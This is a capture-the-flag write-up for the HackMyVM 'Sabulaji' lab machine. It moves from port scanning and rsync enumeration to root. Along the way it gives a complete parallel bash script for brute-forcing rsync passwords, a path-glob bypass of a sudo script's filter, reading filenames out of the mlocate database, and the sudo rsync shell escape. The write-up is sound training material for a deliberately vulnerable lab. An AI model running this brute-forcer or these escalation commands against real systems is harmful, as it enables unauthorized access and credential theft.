# Sabulaji

## Recon

::: details nmap_scan.log
```log
Open 10.0.2.40:22
Open 10.0.2.40:80
Open 10.0.2.40:873
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.0.2.40

PORT    STATE SERVICE REASON  VERSION
22/tcp  open  ssh     syn-ack OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDRmicDuAIhDTuUUa37WCIEK2z2F1aDUtiJpok20zMzkbe1B41ZvvydX3JHjf7mgl0F/HRQlGHiA23Il+dwr0YbbBa2ggd5gDl95RSHhuUff/DIC10OFbP3YU8A4ItFb8pR6dN8jr+zU1SZvfx6FWApSkTJmeLPq9PN889+ibvckJcOMqrm1Y05FW2VCWn8QRvwivnuW7iU51IVz7arFe8JShXOLu0ANNqZEXyJyWjaK+MqyOK6ZtoWdyinEQFua81+tBZuvS+qb+AG15/h5hBsS/tUgVk5SieY6cCRvkYFHB099e1ggrigfnN4Kq2GvzRUYkegjkPzJFQ7BhPyxT/kDKrlVcLX54sXrp0poU5R9SqSnnESXVM4HQfjIIjTrJFufc2nBF+4f8dH3qtQ+jJkcPEKNVSKKEDULEk1BSBdokhh1GidxQY7ok+hEb9/wPmo6RBeb1d5t11SP8R5UHyI/yucRpS2M8hpBaovJv8pX1VwpOz3tUDJWCpkB3K8HDk=
|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBI2Hl4ZEYgnoDQflo03hI6346mXex6OPxHEjxDufHbkQZVosDPFwZttA8gloBLYLtvDVo9LZZwtv7F/EIiQoIHE=
|   256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILRLvZKpSJkETalR4sqzJOh8a4ivZ8wGt1HfdV3OMNY1
80/tcp  open  http    syn-ack Apache httpd 2.4.62 ((Debian))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-title: epages
|_http-server-header: Apache/2.4.62 (Debian)
873/tcp open  rsync   syn-ack (protocol version 31)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
:::

## HTTP

![writeup.png](/assets/pentest/hackmyvm/sabulaji/writeup.png)

Nothing from fuzzing..
```bash
└─$ feroxbuster -u http://sabulaji.hmv/ -w /usr/share/seclists/Discovery/Web-Content/common.txt --thorough -D -C 404,400,403,500 --dont-scan js,css,png,jpeg,jpg,gif -n -x .php,.txt,.html
```

## Rsync

```bash
└─$ nc sabulaji.hmv 873
@RSYNCD: 31.0

└─$ rsync sabulaji.hmv::

public          Public Files
epages          Secret Documents
```

Public files:
```bash
└─$ rsync sabulaji.hmv::public

drwxr-xr-x          4,096 2025/05/15 12:35:39 .
-rw-r--r--            433 2025/05/15 12:35:39 todo.list

└─$ rsync sabulaji.hmv::public/todo.list .

└─$ cat todo.list
To-Do List
=========
1. sabulaji: Remove private sharing settings
   - Review all shared files and folders.
   - Disable any private sharing links or permissions.
2. sabulaji: Change to a strong password
   - Create a new password (minimum 12 characters, include uppercase, lowercase, numbers, and symbols).
   - Update the password in the system settings.
   - Ensure the new password is not reused from other accounts.
=========
```

Secret files need password
```bash
└─$ rsync sabulaji.hmv::epages
Password:
```

[https://github.com/ZyperX/rsync_bruteforcer](https://github.com/ZyperX/rsync_bruteforcer)

Add dash of async...
```bash
#!/bin/bash

if [ $# -lt 5 ]; then
    echo -e "\e[34mSyntax: $0 <username> <ip> <port> <wordlist> <module_directory>\e[0m"
    exit 1
fi

USERNAME="$1"
IP="$2"
PORT="$3"
WORDLIST="$4"
MODULE="$5"
MAX_JOBS=$(( $(nproc) * 100 ))

found=0
COUNT=0

try_password() {
    local PASSWORD="$1"
    printf "\r[+] Trying #%d: \"%s\"..." "$2" "$PASSWORD"
    RSYNC_PASSWORD="$PASSWORD" timeout 5 rsync rsync://"${USERNAME}@${IP}:${PORT}/${MODULE}" > /dev/null 2>&1
    if [ $? -eq 0 ]; then
        echo -e "\n\e[32m[+] Password found: \"$PASSWORD\"\e[0m"
        found=1
        kill 0
    fi
}

while IFS= read -r PASSWORD; do
    COUNT=$((COUNT + 1))
    try_password "$PASSWORD" "$COUNT" &
    while [ "$(jobs -r | wc -l)" -ge "$MAX_JOBS" ]; do
        sleep 0.1
    done
    if [ "$found" -eq 1 ]; then
        break
    fi
done < "$WORDLIST"

wait

if [ "$found" -eq 0 ]; then
    echo -e "\n\e[31m[-] Password not found in wordlist.\e[0m"
    exit 1
fi
```

```bash
└─$ ./brute_rsync.sh sabulaji sabulaji.hmv 873 /usr/share/seclists/Passwords/Default-Credentials/default-passwords.txt epages
[+] Password found: "admin123"
zsh: terminated ...
```

```bash
└─$ RSYNC_PASSWORD=admin123 rsync sabulaji@sabulaji.hmv::epages
drwxr-xr-x          4,096 2025/05/15 12:17:03 .
-rw-r--r--         13,312 2025/05/15 12:17:03 secrets.doc
└─$ RSYNC_PASSWORD=admin123 rsync sabulaji@sabulaji.hmv::epages/secrets.doc .
```

![writeup-1.png](/assets/pentest/hackmyvm/sabulaji/writeup-1.png)

## SSH

```bash
└─$ sshpass -p 'P@ssw0rd123!' ssh welcome@sabulaji.hmv
welcome@Sabulaji:~$ id
uid=1000(welcome) gid=1000(welcome) groups=1000(welcome),123(mlocate)
```

### User.txt

```bash
welcome@Sabulaji:~$ cat user.txt
flag{user-cf7883184194add6adfa5f20b5061ac7}
```

## Lateral Movement (Sabulaji)

```bash
welcome@Sabulaji:~$ sudo -l
Matching Defaults entries for welcome on Sabulaji:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User welcome may run the following commands on Sabulaji:
    (sabulaji) NOPASSWD: /opt/sync.sh
welcome@Sabulaji:~$ cat /opt/sync.sh
#!/bin/bash
if [ -z $1 ]; then echo "error: note missing"; exit; fi

note=$1
if [[ "$note" == *"sabulaji"* ]]; then echo "error: forbidden"; exit; fi

difference=$(diff /home/sabulaji/personal/notes.txt $note)
if [ -z "$difference" ]; then echo "no update"; exit; fi

echo "Difference: $difference"
cp $note /home/sabulaji/personal/notes.txt
echo "[+] Updated."
```

Hmmm... Sabulaji has a personal directory and we are able to read files as long as we don't have word `sabulaji` in path and know filename. 
```bash
welcome@Sabulaji:~$ ls -alh /home/sabulaji/personal -d
drwx------ 2 sabulaji sabulaji 4.0K May 16 01:33 /home/sabulaji/personal
```

The `personal` directory may hold additional files. Since we can’t list it directly, we either brute-force access or rely on cached metadata. The `locate` command is available, but it doesn’t return results because of permissions. However, its database still stores filenames. By inspecting `/var/lib/mlocate/mlocate.db` with `strings` and filtering for `/home/sabulaji/personal`, we recover entries such as `creds.txt` and `notes.txt`, confirming the presence of hidden files inside that directory.
```bash
welcome@Sabulaji:~$ locate notes.txt

welcome@Sabulaji:~$ strings /var/lib/mlocate/mlocate.db | grep /home/sabulaji/personal -A5
/home/sabulaji/personal
creds.txt
notes.txt
/home/welcome
.bash_history
.bash_logout
```

```bash
welcome@Sabulaji:~$ sudo -u sabulaji /opt/sync.sh /home/s*/personal/creds.txt
Difference: 1c1
< 1001
---
> Sensitive Credentials:Z2FzcGFyaW4=
[+] Updated.
welcome@Sabulaji:~$ echo Z2FzcGFyaW4= | base64 -d;echo
gasparin
```

> Creds: `sabulaji:Z2FzcGFyaW4=`

::: info Note
Password was not base64 decoded version, but **encoded** version.
:::

## Privilege Escalation (root)

```bash
└─$ sshpass -p 'Z2FzcGFyaW4=' ssh sabulaji@sabulaji.hmv
sabulaji@Sabulaji:~$ id
uid=1001(sabulaji) gid=1001(sabulaji) groups=1001(sabulaji)
sabulaji@Sabulaji:~$ sudo -l
Matching Defaults entries for sabulaji on Sabulaji:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User sabulaji may run the following commands on Sabulaji:
    (ALL) NOPASSWD: /usr/bin/rsync
```

[https://gtfobins.github.io/gtfobins/rsync/#sudo](https://gtfobins.github.io/gtfobins/rsync/#sudo)

```bash
sabulaji@Sabulaji:~$ sudo rsync -e 'sh -c "bash 0<&2 1>&2"' 127.0.0.1:/dev/null
root@Sabulaji:/home/sabulaji# id
uid=0(root) gid=0(root) groups=0(root)
```

### Root.txt

```
root@Sabulaji:/home/sabulaji# cat /root/root.txt
flag{root-89e62d8807f7986edb259eb2237d011c}
```